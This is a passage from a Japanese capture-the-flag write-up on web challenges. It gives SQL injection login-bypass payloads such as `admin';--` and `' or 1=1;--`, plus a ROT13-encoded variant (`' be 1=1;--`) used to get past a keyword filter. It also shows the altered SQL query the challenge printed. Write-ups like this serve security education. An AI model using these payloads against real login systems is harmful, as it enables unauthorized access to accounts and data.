普通にUsernameに`admin';--`と入れたら突破できた。これ本当に350ptか？
（追記）`admin' or 1=1;--`としたら`SQLi detected`と表示されて弾かれた。

## 400pt

### Irish-Name-Repo 3 (web, 400)

Irish-Name-Repo 1と同じように`debug`フォームを出現させて1と入力し、パスワードとして`' or 1=1;--`を与えてみる。
すると次のように表示された。

```txt
password: ' or 1=1;--
SQL query: SELECT * FROM admin where password = '' be 1=1;--'
```

`or`と入れたのに`be`に置換されているらしい。oの3文字後がrで、bの3文字後もeなので、シーザー暗号の要領で13文字分だけ（=ROT13）後ろにずらされているようだ。
`or`を13文字前にずらすと`be`なので、パスワードとして`' be 1=1;--`と入力してみる。
するとログインに成功し、flagを入手できた。
